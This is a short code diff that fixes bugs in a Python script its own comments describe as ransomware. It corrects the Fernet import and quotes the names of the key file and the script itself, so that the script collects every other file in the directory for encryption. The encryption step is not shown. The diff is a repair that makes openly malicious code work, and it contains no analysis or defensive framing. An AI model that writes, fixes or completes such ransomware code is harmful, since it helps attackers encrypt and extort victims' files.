@@ -1,12 +1,12 @@
 import os
-from cryptography.Fernet import Fernet
+from cryptography.fernet import Fernet
 
 # Files will store the file we want to ransomware
 files = []
 
 # Ignoring the ransomware attack files
 for file in os.listdir():
-  if file == thekey.key or file == supersafe.py:
+  if file == "thekey.key" or file == "supersafe.py":
     continue
   if os.path.isfile(file):
     files.append(file)
